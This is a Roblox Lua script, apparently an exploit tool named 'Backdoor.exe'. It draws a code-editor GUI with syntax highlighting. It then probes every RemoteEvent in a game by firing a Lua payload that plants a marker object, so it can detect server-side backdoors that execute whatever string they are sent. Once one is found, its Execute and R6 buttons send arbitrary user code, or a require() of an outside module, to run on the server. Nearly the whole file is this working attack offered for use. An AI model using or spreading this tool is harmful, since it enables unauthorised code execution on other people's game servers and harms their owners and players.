LocalPlayer = game:GetService("Players").LocalPlayer

function Notify(title, text)
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = title,
            Text = text
        }
    )
end


local salt = "41684139854"
for _, gui in pairs(game:GetService("CoreGui").RobloxGui:GetChildren()) do
    if gui:IsA("ScreenGui") and string.match(gui.Name, salt) then
        gui:Destroy()
    end
end

local backdoorexesource = Instance.new("ScreenGui")
if syn then syn.protect_gui(backdoorexesource) end
local Main = Instance.new("Frame")
local sourceFrame = Instance.new("ScrollingFrame")
local source = Instance.new("TextBox")
local lines = Instance.new("TextLabel")
local Globals_ = Instance.new("TextLabel")
local Keywords_ = Instance.new("TextLabel")
local Numbers_ = Instance.new("TextLabel")
local RemoteHighlight_ = Instance.new("TextLabel")
local Strings_ = Instance.new("TextLabel")
local Tokens_ = Instance.new("TextLabel")
local Comments_ = Instance.new("TextLabel")
local executeButton = Instance.new("TextButton")
local AttachButton = Instance.new("TextButton")
local clearButton = Instance.new("TextButton")
local closeButton = Instance.new("TextButton")
local Minimise = Instance.new("TextButton")
local backdoorexe = Instance.new("TextLabel")
local R6Button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local sourceEngine = Instance.new("TextLabel")
local Disc = Instance.new("TextButton")

backdoorexesource.Name = tostring(math.random(100000000,1000000000) .. salt)
backdoorexesource.Parent = game.CoreGui.RobloxGui
backdoorexesource.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
backdoorexesource.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = backdoorexesource
Main.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Main.BorderColor3 = Color3.fromRGB(31, 31, 31)
Main.BorderSizePixel = 2
Main.Position = UDim2.new(0.264460564, 0, 0.279420495, 0)
Main.Size = UDim2.new(0, 624, 0, 358)

sourceFrame.Name = "sourceFrame"
sourceFrame.Parent = Main
sourceFrame.Active = true
sourceFrame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
sourceFrame.BorderColor3 = Color3.fromRGB(26, 26, 26)
sourceFrame.BorderSizePixel = 3
sourceFrame.Position = UDim2.new(0.0199999679, 0, 0.0970791876, 0)
sourceFrame.Size = UDim2.new(0, 598, 0, 270)

source.Name = "source"
source.Parent = sourceFrame
source.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
source.BorderSizePixel = 0
source.Position = UDim2.new(0.0352144279, 0, 0, 0)
source.Size = UDim2.new(0, 569, 0, 1744)
source.ClearTextOnFocus = false
source.Font = Enum.Font.Code
source.MultiLine = true
source.PlaceholderText = "--script here"
source.Text = ""
source.TextColor3 = Color3.fromRGB(255, 255, 255)
source.TextSize = 18.000
source.TextWrapped = true
source.TextXAlignment = Enum.TextXAlignment.Left
source.TextYAlignment = Enum.TextYAlignment.Top

lines.Name = "lines"
lines.Parent = source
lines.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
lines.BorderColor3 = Color3.fromRGB(84, 84, 84)
lines.Position = UDim2.new(-0.0403855219, 0, 0, 0)
lines.Size = UDim2.new(0, 20, 0, 1742)
lines.Font = Enum.Font.Code
lines.Text = "1"
lines.TextColor3 = Color3.fromRGB(255, 255, 255)
lines.TextSize = 18.000
lines.TextYAlignment = Enum.TextYAlignment.Top

Globals_.Name = "Globals_"
Globals_.Parent = source
Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals_.BackgroundTransparency = 1.000
Globals_.ClipsDescendants = true
Globals_.Size = UDim2.new(0, 561, 0, 1744)
Globals_.ZIndex = 5
Globals_.Font = Enum.Font.Code
Globals_.Text = ""
Globals_.TextColor3 = Color3.fromRGB(132, 214, 247)
Globals_.TextSize = 18.000
Globals_.TextWrapped = true
Globals_.TextXAlignment = Enum.TextXAlignment.Left
Globals_.TextYAlignment = Enum.TextYAlignment.Top

Keywords_.Name = "Keywords_"
Keywords_.Parent = source
Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords_.BackgroundTransparency = 1.000
Keywords_.ClipsDescendants = true
Keywords_.Size = UDim2.new(0, 561, 0, 1744)
Keywords_.ZIndex = 5
Keywords_.Font = Enum.Font.Code
Keywords_.Text = ""
Keywords_.TextColor3 = Color3.fromRGB(248, 109, 124)
Keywords_.TextSize = 18.000
Keywords_.TextWrapped = true
Keywords_.TextXAlignment = Enum.TextXAlignment.Left
Keywords_.TextYAlignment = Enum.TextYAlignment.Top

Numbers_.Name = "Numbers_"
Numbers_.Parent = source
Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers_.BackgroundTransparency = 1.000
Numbers_.ClipsDescendants = true
Numbers_.Size = UDim2.new(0, 561, 0, 1744)
Numbers_.ZIndex = 4
Numbers_.Font = Enum.Font.Code
Numbers_.Text = ""
Numbers_.TextColor3 = Color3.fromRGB(255, 194, 89)
Numbers_.TextSize = 18.000
Numbers_.TextWrapped = true
Numbers_.TextXAlignment = Enum.TextXAlignment.Left
Numbers_.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight_.Name = "RemoteHighlight_"
RemoteHighlight_.Parent = source
RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight_.BackgroundTransparency = 1.000
RemoteHighlight_.ClipsDescendants = true
RemoteHighlight_.Size = UDim2.new(0, 561, 0, 1744)
RemoteHighlight_.ZIndex = 5
RemoteHighlight_.Font = Enum.Font.Code
RemoteHighlight_.Text = ""
RemoteHighlight_.TextColor3 = Color3.fromRGB(11, 255, 203)
RemoteHighlight_.TextSize = 18.000
RemoteHighlight_.TextWrapped = true
RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top

Strings_.Name = "Strings_"
Strings_.Parent = source
Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings_.BackgroundTransparency = 1.000
Strings_.ClipsDescendants = true
Strings_.Size = UDim2.new(0, 561, 0, 1744)
Strings_.ZIndex = 5
Strings_.Font = Enum.Font.Code
Strings_.Text = ""
Strings_.TextColor3 = Color3.fromRGB(173, 241, 149)
Strings_.TextSize = 18.000
Strings_.TextWrapped = true
Strings_.TextXAlignment = Enum.TextXAlignment.Left
Strings_.TextYAlignment = Enum.TextYAlignment.Top

Tokens_.Name = "Tokens_"
Tokens_.Parent = source
Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.BackgroundTransparency = 1.000
Tokens_.ClipsDescendants = true
Tokens_.Size = UDim2.new(0, 561, 0, 1744)
Tokens_.ZIndex = 5
Tokens_.Font = Enum.Font.Code
Tokens_.Text = ""
Tokens_.TextColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.TextSize = 18.000
Tokens_.TextWrapped = true
Tokens_.TextXAlignment = Enum.TextXAlignment.Left
Tokens_.TextYAlignment = Enum.TextYAlignment.Top

Comments_.Name = "Comments_"
Comments_.Parent = source
Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments_.BackgroundTransparency = 1.000
Comments_.ClipsDescendants = true
Comments_.Size = UDim2.new(0, 561, 0, 1744)
Comments_.Visible = false
Comments_.ZIndex = 5
Comments_.Font = Enum.Font.Code
Comments_.Text = ""
Comments_.TextColor3 = Color3.fromRGB(86, 86, 86)
Comments_.TextSize = 18.000
Comments_.TextTransparency = 1.000
Comments_.TextWrapped = true
Comments_.TextXAlignment = Enum.TextXAlignment.Left
Comments_.TextYAlignment = Enum.TextYAlignment.Top

executeButton.Name = "executeButton"
executeButton.Parent = Main
executeButton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
executeButton.BorderSizePixel = 0
executeButton.Position = UDim2.new(0.0192307699, 0, 0.881985486, 0)
executeButton.Size = UDim2.new(0, 200, 0, 33)
executeButton.Font = Enum.Font.Gotham
executeButton.Text = "Execute"
executeButton.TextColor3 = Color3.fromRGB(50, 50, 50)
executeButton.TextSize = 20.000

AttachButton.Name = "AttachButton"
AttachButton.Parent = Main
AttachButton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
AttachButton.BorderSizePixel = 0
AttachButton.Position = UDim2.new(0.355769217, 0, 0.881985486, 0)
AttachButton.Size = UDim2.new(0, 179, 0, 33)
AttachButton.Font = Enum.Font.Gotham
AttachButton.Text = "Attach"
AttachButton.TextColor3 = Color3.fromRGB(255,255,255)
AttachButton.TextSize = 20.000

clearButton.Name = "clearButton"
clearButton.Parent = Main
clearButton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
clearButton.BorderSizePixel = 0
clearButton.Position = UDim2.new(0.657051265, 0, 0.881985486, 0)
clearButton.Size = UDim2.new(0, 200, 0, 33)
clearButton.Font = Enum.Font.Gotham
clearButton.Text = "Clear"
clearButton.TextColor3 = Color3.fromRGB(50, 50, 50)
clearButton.TextSize = 20.000

closeButton.Name = "closeButton"
closeButton.Parent = Main
closeButton.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
closeButton.BorderSizePixel = 0
closeButton.Position = UDim2.new(0.915064096, 0, 0.0183475856, 0)
closeButton.Size = UDim2.new(0, 39, 0, 20)
closeButton.Font = Enum.Font.Gotham
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 66, 69)
closeButton.TextSize = 20.000

Minimise.Name = "Minimise"
Minimise.Parent = Main
Minimise.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Minimise.BorderSizePixel = 0
Minimise.Position = UDim2.new(0.842948735, 0, 0.0183475856, 0)
Minimise.Size = UDim2.new(0, 39, 0, 20)
Minimise.Font = Enum.Font.Gotham
Minimise.Text = "-"
Minimise.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimise.TextSize = 20.000

backdoorexe.Name = "backdoorexe"
backdoorexe.Parent = Main
backdoorexe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
backdoorexe.BackgroundTransparency = 1.000
backdoorexe.BorderSizePixel = 0
backdoorexe.Position = UDim2.new(0.0176282059, 0, 0.0195487682, 0)
backdoorexe.Size = UDim2.new(0, 178, 0, 19)
backdoorexe.Font = Enum.Font.Gotham
backdoorexe.Text = "Backdoor.exe"
backdoorexe.TextColor3 = Color3.fromRGB(255, 255, 255)
backdoorexe.TextSize = 30.000

R6Button.Name = "R6Button"
R6Button.Parent = Main
R6Button.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
R6Button.BorderSizePixel = 0
R6Button.Position = UDim2.new(0.767628193, 0, 0.0183475856, 0)
R6Button.Size = UDim2.new(0, 39, 0, 20)
R6Button.Font = Enum.Font.Gotham
R6Button.Text = "R6"
R6Button.TextColor3 = Color3.fromRGB(50, 50, 50)
R6Button.TextSize = 20.000

UICorner.Parent = R6Button

sourceEngine.Name = "sourceEngine"
sourceEngine.Parent = Main
sourceEngine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sourceEngine.BackgroundTransparency = 1.000
sourceEngine.BorderSizePixel = 0
sourceEngine.Position = UDim2.new(0.288461536, 0, 0.0183475427, 0)
sourceEngine.Size = UDim2.new(0, 94, 0, 9)
sourceEngine.Font = Enum.Font.Gotham
sourceEngine.Text = "Source λ"
sourceEngine.TextColor3 = Color3.fromRGB(255, 134, 47)
sourceEngine.TextSize = 18.000

Disc.Name = "Discord"
Disc.Parent = Main
Disc.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Disc.BorderSizePixel = 0
Disc.Position = UDim2.new(0.552948735, 0, 0.0183475856, 0)
Disc.Size = UDim2.new(0, 120, 0, 20)
Disc.Font = Enum.Font.Gotham
Disc.Text = " Disc: 4tRadfjY69"
Disc.TextColor3 = Color3.fromRGB(255, 255, 255)
Disc.TextSize = 15
Disc.TextScaled = true

verboseOutput = false
instantScanMode = true
local UserInputService = game:GetService("UserInputService")
local gui = Main
local dragging
local dragInput
local dragStart
local startPos
EasingDir = Enum.EasingDirection.Out
EasingSty = Enum.EasingStyle.Quint
EasingTim = 0.69 --nice
EasingOve = true

local function update(input)
    local delta = input.Position - dragStart
    gui:TweenPosition(
        UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y),
        EasingDir,
        EasingSty,
        EasingTim,
        EasingOve
    )
    game:GetService("RunService").Stepped:Wait()
end
gui.InputBegan:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            input.Changed:Connect(
                function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end
            )
        end
    end
)
gui.InputChanged:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end
)
UserInputService.InputChanged:Connect(
    function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end
)

checkDebounce = true
function Attached()
    if workspace:FindFirstChild(valueName) then
    game.workspace:WaitForChild(valueName):Destroy()
    end
    executeButton.TextColor3 = Color3.fromRGB(255,255,255)
    clearButton.TextColor3 = Color3.fromRGB(255,255,255)
    R6Button.TextColor3 = Color3.fromRGB(255,255,255)
    source.TextEditable = true
    Notify('Backdoor.exe','Attached')
    found = true
end
cachEnabled = false
found = false
local LocalPlayer = LocalPlayer
valueName =
    "dfees2x" ..
    LocalPlayer.Name ..
        string.char(math.random(65, 90)) .. string.char(math.random(65, 90)) .. math.random(100000, 999999)
function check()
    if workspace:FindFirstChild(valueName) then
        remote = stringToInstance(workspace:FindFirstChild(valueName).Value)
        return true
    end
end
function stringToInstance(str) -- Credits to the DevForum
    local dir = str
    local segments = dir:split(".")
    local current = game
    for i, v in pairs(segments) do
        current = current[v]
    end
    return current
end
function scan()
    found = false
    scanDebounce = false
    executeButton.TextColor3 = Color3.fromRGB(50, 50, 50)
    clearButton.TextColor3 = Color3.fromRGB(50, 50, 50)
    R6Button.TextColor3 = Color3.fromRGB(50, 50, 50)
    source.TextEditable = false
    for _, rm in pairs(game:GetDescendants()) do
        if rm.ClassName == "RemoteEvent" and not found then
            if rm.Parent ~= game:GetService("JointsService") then
            rm:FireServer(
                "a = Instance.new('StringValue',workspace) a.Name = '" ..
                    valueName .. "' a.Value = '" .. rm:GetFullName() .. "'"
            )
            game:GetService("RunService").Stepped:Wait()
            end
            if check() then
                Attached()
                backdoor = remote:GetFullName()
                break
            end
        end
    end
    if not found then
        wait(1.5)
        if check() then
            Attached()
            backdoor = remote:GetFullName()
        end
    end
    if not found then
        Notify("backdoor.exe","Status: failed to find a backdoor")
    end
    wait(0.01)
    scanDebounce = true
end
Adebounce = true
AttachButton.MouseButton1Click:Connect(
    function()
        if Adebounce then
            Adebounce = false
            for _, cach in pairs(game:GetDescendants()) do
                if cach.ClassName == "StringValue" and cach.Name == "cached remote" then
                    local backdoor = cach.Parent:GetFullName()
                    remote = cach.Parent
                    Attached()
                    cached = true
                    Adebounce = true
                    break
                end
            end
            if game.ReplicatedStorage:FindFirstChild("Chat") then
                qrm = game.ReplicatedStorage:FindFirstChild("Chat")
                qrm:FireServer(Script)
                wait(0.15)
                if check(qrm) then
                    Attached()
                end
                rsc = true
            end
            if not cached and not rsc then
                scan()
                Adebounce = true
            end
        end
    end
)
clearButton.MouseButton1Click:Connect(
    function()
        source.TextEditable = false
        source.Text = "*poof*"
        wait(.25)
        source.Text = ""
        source.TextEditable = true
    end
)

Disc.MouseButton1Click:Connect(
    function()
        setclipboard("https://discord.gg/4tRadfjY69")
    end
)

closeButton.MouseButton1Click:Connect(
    function()
        Main:TweenPosition(UDim2.new(0, 0, -1, 0))
        wait(1)
        backdoorexesource:Destroy()
    end
)
R6Button.MouseButton1Click:Connect(
    function()
        if found then
            remote:FireServer('require(3041175937):r6("' .. LocalPlayer.Name .. '")')
        end
    end
)
executeButton.MouseButton1Click:connect(
    function()
        if found then
            remote:FireServer(source.Text)
        end
    end
)
scanDebounce = true

-- Line Counter -- Credits to JohnWare, just slightly modified it..
-- This code is amazing code
source.Changed:Connect(
    function(Change)
        if Change == "TextBounds" then
            local Amount = source.TextBounds.Y / 18
            lines.Text = ""
            for i = 1, Amount do
                lines.Text = lines.Text .. i .. "\n"
            end
        end
    end
)

-- [[ Syntax Highlight ]] -- Not made by me, I DO NOT TAKE CREDITS FOR THESE NOT IN THE SLIGHTEST IM NOT SMART ENOUGH FOR THIS SHIT
-- also amazing code and I could never come up with this, ALL credits go to the respectfull creator! idk who... but +rep for them..
local lua_keywords = {
    "and",
    "break",
    "do",
    "else",
    "elseif",
    "end",
    "false",
    "for",
    "function",
    "goto",
    "if",
    "in",
    "local",
    "nil",
    "not",
    "or",
    "repeat",
    "return",
    "then",
    "true",
    "until",
    "while"
}
local global_env = {
    "getrawmetatable",
    "game",
    "workspace",
    "script",
    "math",
    "string",
    "table",
    "print",
    "wait",
    "BrickColor",
    "Color3",
    "next",
    "pairs",
    "ipairs",
    "select",
    "unpack",
    "Instance",
    "Vector2",
    "Vector3",
    "CFrame",
    "Ray",
    "UDim2",
    "Enum",
    "assert",
    "error",
    "warn",
    "tick",
    "loadstring",
    "_G",
    "shared",
    "getfenv",
    "setfenv",
    "newproxy",
    "setmetatable",
    "getmetatable",
    "os",
    "debug",
    "pcall",
    "ypcall",
    "xpcall",
    "rawequal",
    "rawset",
    "rawget",
    "tonumber",
    "tostring",
    "type",
    "typeof",
    "_VERSION",
    "coroutine",
    "delay",
    "require",
    "spawn",
    "LoadLibrary",
    "settings",
    "stats",
    "time",
    "UserSettings",
    "version",
    "Axes",
    "ColorSequence",
    "Faces",
    "ColorSequenceKeypoint",
    "NumberRange",
    "NumberSequence",
    "NumberSequenceKeypoint",
    "gcinfo",
    "elapsedTime",
    "collectgarbage",
    "PhysicalProperties",
    "Rect",
    "Region3",
    "Region3int16",
    "UDim",
    "Vector2int16",
    "Vector3int16"
}
local Highlight = function(string, keywords)
    local K = {}
    local S = string
    local Token = {
        ["="] = true,
        ["."] = true,
        [","] = true,
        ["("] = true,
        [")"] = true,
        ["["] = true,
        ["]"] = true,
        ["{"] = true,
        ["}"] = true,
        [":"] = true,
        ["*"] = true,
        ["/"] = true,
        ["+"] = true,
        ["-"] = true,
        ["%"] = true,
        [";"] = true,
        ["~"] = true
    }
    for i, v in pairs(keywords) do
        K[v] = true
    end
    S =
        S:gsub(
        ".",
        function(c)
            if Token[c] ~= nil then
                return "\32"
            else
                return c
            end
        end
    )
    S =
        S:gsub(
        "%S+",
        function(c)
            if K[c] ~= nil then
                return c
            else
                return (" "):rep(#c)
            end
        end
    )
    return S
end
local hTokens = function(string)
    local Token = {
        ["="] = true,
        ["."] = true,
        [","] = true,
        ["("] = true,
        [")"] = true,
        ["["] = true,
        ["]"] = true,
        ["{"] = true,
        ["}"] = true,
        [":"] = true,
        ["*"] = true,
        ["/"] = true,
        ["+"] = true,
        ["-"] = true,
        ["%"] = true,
        [";"] = true,
        ["~"] = true
    }
    local A = ""
    string:gsub(
        ".",
        function(c)
            if Token[c] ~= nil then
                A = A .. c
            elseif c == "\n" then
                A = A .. "\n"
            elseif c == "\t" then
                A = A .. "\t"
            else
                A = A .. "\32"
            end
        end
    )
    return A
end
local strings = function(string)
    local highlight = ""
    local quote = false
    string:gsub(
        ".",
        function(c)
            if quote == false and c == '"' then
                quote = true
            elseif quote == false and c == "'" then
                quote = true
            elseif quote == true and c == '"' then
                quote = false
            elseif quote == true and c == "'" then
                quote = false
            end
            if quote == false and c == '"' then
                highlight = highlight .. '"'
            elseif quote == false and c == "'" then
                highlight = highlight .. "'"
            elseif c == "\n" then
                highlight = highlight .. "\n"
            elseif c == "\t" then
                highlight = highlight .. "\t"
            elseif quote == true then
                highlight = highlight .. c
            elseif quote == false then
                highlight = highlight .. "\32"
            end
        end
    )
    return highlight
end
local comments = function(string)
    local ret = ""
    string:gsub(
        "[^\r\n]+",
        function(c)
            local comm = false
            local i = 0
            c:gsub(
                ".",
                function(n)
                    i = i + 1
                    if c:sub(i, i + 1) == "--" then
                        comm = true
                    end
                    if comm == true then
                        ret = ret .. n
                    else
                        ret = ret .. "\32"
                    end
                end
            )
            ret = ret
        end
    )
    return ret
end
local numbers = function(string)
    local A = ""
    string:gsub(
        ".",
        function(c)
            if tonumber(c) ~= nil then
                A = A .. c
            elseif c == "\n" then
                A = A .. "\n"
            elseif c == "\t" then
                A = A .. "\t"
            else
                A = A .. "\32"
            end
        end
    )
    return A
end
local highlight_source = function(type)
    if type == "Text" then
        source.Text = source.Text:gsub("\13", "")
        source.Text = source.Text:gsub("\t", "      ")
        local s = source.Text
        source.Keywords_.Text = Highlight(s, lua_keywords)
        source.Globals_.Text = Highlight(s, global_env)
        source.RemoteHighlight_.Text =
            Highlight(
            s,
            {
                "FireServer",
                "fireServer",
                "InvokeServer",
                "invokeServer"
            }
        )
        source.Tokens_.Text = hTokens(s)
        source.Numbers_.Text = numbers(s)
        source.Strings_.Text = strings(s)
        source.Comments_.Text = comments(s)
        local lin = 1
        s:gsub(
            "\n",
            function()
                lin = lin + 1
            end
        )
        lines.Text = ""
        for i = 1, lin do
            lines.Text = lines.Text .. i .. "\n"
        end
    end
end
highlight_source("Text")
source.Changed:Connect(highlight_source)

--------------------------------------------------------------------------------------------------------\
WelcomeString = "Thank you for using Backdoor.exe Source\nBy iK4oS and Designed by Scotty! <3"
for i = 1, string.len(WelcomeString) do
    wait(.01)
    source.Text = string.sub(WelcomeString, 1, i)
end
